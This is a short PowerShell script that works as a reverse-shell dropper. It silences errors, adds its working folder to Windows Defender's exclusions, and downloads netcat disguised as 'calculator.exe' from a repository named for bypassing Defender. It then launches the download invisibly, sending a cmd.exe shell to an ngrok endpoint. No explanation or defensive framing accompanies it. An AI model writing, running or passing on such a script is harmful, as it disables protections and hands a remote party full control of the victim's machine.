$ErrorActionPreference = 'SilentlyContinue'

$TempDir = "C:\TempVBS"
$NcPath = "$TempDir\nc.exe"

try {
    New-Item -ItemType Directory -Force -Path $TempDir | Out-Null
} catch {}

try {
    Add-MpPreference -ExclusionPath $TempDir
} catch {}

try {
    Invoke-WebRequest -Uri "https://raw.githubusercontent.com/KaiKim2/WindowsDefenderBypassNetcat/main/calculator.exe" -OutFile $NcPath
} catch {}

try {
    $WshShell = New-Object -ComObject WScript.Shell
    $WshShell.Run("`"$NcPath`" 0.tcp.in.ngrok.io 18378 -e cmd.exe", 0, $false)
} catch {}

Start-Sleep -Seconds 5
